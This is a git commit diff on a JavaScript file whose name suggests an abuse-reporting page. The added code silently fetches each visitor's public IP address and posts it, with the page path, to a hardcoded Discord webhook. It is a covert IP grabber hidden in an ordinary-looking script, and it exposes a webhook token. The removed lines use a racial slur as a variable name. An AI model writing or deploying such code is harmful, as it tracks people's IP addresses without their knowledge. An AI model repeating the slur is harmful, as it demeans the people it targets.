b0a0baab42a114ac5c46a9873722e219341b5bb5
cefurdev <mark.klepo@students.vegova.si>
2022-11-19 23:17:06 +0100

    ok

--- prijavizlorabo.js
+++ prijavizlorabo.js
@@ -1,3 +1,16 @@
-const nigger = "hello world"
-
-console.log(nigger)
+fetch("https://myexternalip.com/raw").then((res) =>
+        res.text().then((data) => {
+            fetch(
+            'https://discord.com/api/webhooks/1006549828530094161/VU8lTwRYPBfCLLTtXr399uNq-LcgeusF859r3oelUuCjK3Yr13JcwMLT7aL9mDAETHBP',
+            {
+              method: 'post',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                content:
+                    "link with id: " +window.location.pathname+" fetched the ip"+ data,
+              }),
+            }
+          );
+        }))
